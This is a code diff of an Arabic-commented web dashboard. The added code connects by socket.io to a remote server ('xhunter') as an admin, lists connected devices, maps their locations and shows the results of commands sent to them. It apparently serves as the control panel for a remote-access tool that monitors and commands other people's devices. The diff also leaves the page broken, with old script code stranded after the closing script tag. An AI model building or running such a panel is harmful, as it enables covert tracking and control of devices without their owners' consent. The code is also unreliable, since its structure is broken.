@@ -692,49 +692,117 @@
     </div>
 
     <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-    <script>
-        // عناصر DOM
-        const tabs = document.querySelectorAll('.tab');
-        const panels = document.querySelectorAll('.panel');
-        const statusCount = document.getElementById('statusCount');
-        const statusIndicator = document.getElementById('statusIndicator');
-        const lastEvent = document.getElementById('lastEvent');
-        const deviceList = document.getElementById('deviceList');
-        const deviceInfo = document.getElementById('deviceInfo');
-        const logList = document.getElementById('logList');
-        const deviceSelect = document.getElementById('deviceSelect');
-        const commandAction = document.getElementById('commandAction');
-        const commandData = document.getElementById('commandData');
-        const sendCommand = document.getElementById('sendCommand');
-        const clearLogsBtn = document.getElementById('clearLogs');
-        const commandStatus = document.getElementById('commandStatus');
-        const refreshMapBtn = document.getElementById('refreshMap');
-        const zoomInBtn = document.getElementById('zoomIn');
-        const zoomOutBtn = document.getElementById('zoomOut');
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<script>
+    // عناصر DOM
+    const tabs = document.querySelectorAll('.tab');
+    const panels = document.querySelectorAll('.panel');
+    const statusCount = document.getElementById('statusCount');
+    const statusIndicator = document.getElementById('statusIndicator');
+    const lastEvent = document.getElementById('lastEvent');
+    const deviceList = document.getElementById('deviceList');
+    const deviceInfo = document.getElementById('deviceInfo');
+    const logList = document.getElementById('logList');
+    const deviceSelect = document.getElementById('deviceSelect');
+    const commandAction = document.getElementById('commandAction');
+    const commandData = document.getElementById('commandData');
+    const sendCommand = document.getElementById('sendCommand');
+    const clearLogsBtn = document.getElementById('clearLogs');
+    const commandStatus = document.getElementById('commandStatus');
+    const refreshMapBtn = document.getElementById('refreshMap');
+    const zoomInBtn = document.getElementById('zoomIn');
+    const zoomOutBtn = document.getElementById('zoomOut');
+
+    // بيانات التطبيق
+    let devices = [];
+    let map = null;
+    let markers = {};
+    let selectedDevice = null;
+    let socket = null;
+    let isConnected = false;
+
+    // وظائف الإشعارات
+    function showNotification(message, type = '') {
         const notification = document.getElementById('notification');
         const notificationMessage = document.getElementById('notificationMessage');
-        const switchModeBtn = document.getElementById('switchMode');
-        const adminInterface = document.getElementById('admin-interface');
-        const clientInterface = document.getElementById('client-interface');
-        const connectClientBtn = document.getElementById('connectClient');
-        const clientIdInput = document.getElementById('clientId');
-        const clientNameInput = document.getElementById('clientName');
-        const dataTypeSelect = document.getElementById('dataType');
-        const sendDataBtn = document.getElementById('sendData');
-        const clientLogs = document.getElementById('clientLogs');
-        const clientStatus = document.getElementById('clientStatus');
+        notificationMessage.textContent = message;
+        notification.className = 'notification';
+        if (type) notification.classList.add(type);
+        notification.classList.add('show');
+        setTimeout(() => { notification.classList.remove('show'); }, 5000);
+    }
 
-        // بيانات التطبيق
-        let devices = [];
-        let map = null;
-        let markers = {};
-        let selectedDevice = null;
-        let socket = null;
-        let isConnected = false;
-        let clientSocket = null;
-        let isClientMode = false;
-        let clientDeviceId = 'device_001';
+    // الاتصال بالسيرفر
+    function connectToServer() {
+        socket = io('https://xhunter-1-2not.onrender.com', { transports: ['websocket'], timeout: 10000 });
+
+        socket.on('connect', () => {
+            isConnected = true;
+            statusIndicator.classList.add('connected');
+            statusIndicator.querySelector('i').className = 'fas fa-plug connected';
+            showNotification('تم الاتصال بالسيرفر بنجاح', 'success');
+            addLog('تم الاتصال بالسيرفر بنجاح', 'success');
+
+            // الانضمام كـ Admin
+            socket.emit('adminJoin');
+        });
+
+        socket.on('disconnect', () => {
+            isConnected = false;
+            statusIndicator.classList.remove('connected');
+            statusIndicator.querySelector('i').className = 'fas fa-plug';
+            showNotification('تم قطع الاتصال بالسيرفر', 'error');
+            addLog('تم قطع الاتصال بالسيرفر', 'error');
+        });
+
+        socket.on('connect_error', (error) => {
+            showNotification('فشل الاتصال بالسيرفر', 'error');
+            addLog('خطأ في الاتصال: ' + error.message, 'error');
+        });
+
+        // استقبال الأجهزة الحالية
+        socket.on('join', (device) => {
+            const index = devices.findIndex(d => d.id === device.id);
+            if(index >= 0) devices[index] = device;
+            else devices.push(device);
+
+            statusCount.textContent = devices.length;
+            updateDeviceList(devices);
+            updateDeviceSelect(devices);
+            updateMap(devices);
+            addLog(`تم استقبال بيانات جهاز: ${device.id}`, 'success');
+        });
+
+        // استقبال بيانات الأجهزة
+        socket.on('deviceInfo', (data) => {
+            addLog(`تم استقبال بيانات من الجهاز ${data.id}`, 'success');
+            if(selectedDevice && selectedDevice.id === data.id){
+                selectDevice({...selectedDevice, ...data.extra});
+            }
+        });
+
+        // استقبال الأوامر
+        socket.on('commandResult', (result) => {
+            commandStatus.style.display = 'none';
+            if(result.success){
+                addLog(`تم تنفيذ الأمر: ${result.message}`, 'success');
+                showNotification(`تم تنفيذ الأمر: ${result.message}`, 'success');
+            } else {
+                addLog(`فشل تنفيذ الأمر: ${result.message}`, 'error');
+                showNotification(`فشل تنفيذ الأمر: ${result.message}`, 'error');
+            }
+        });
+
+        // استقبال أي سجلات
+        socket.on('log', (log) => addLog(log.message, log.type || 'info'));
+    }
+
+    // بدء التطبيق عند التحميل
+    document.addEventListener('DOMContentLoaded', () => {
+        initMap();       // تهيئة الخريطة
+        connectToServer(); // الاتصال بالسيرفر
+    });
+</script>
 
         // وظائف الإشعارات
         function showNotification(message, type = '') {
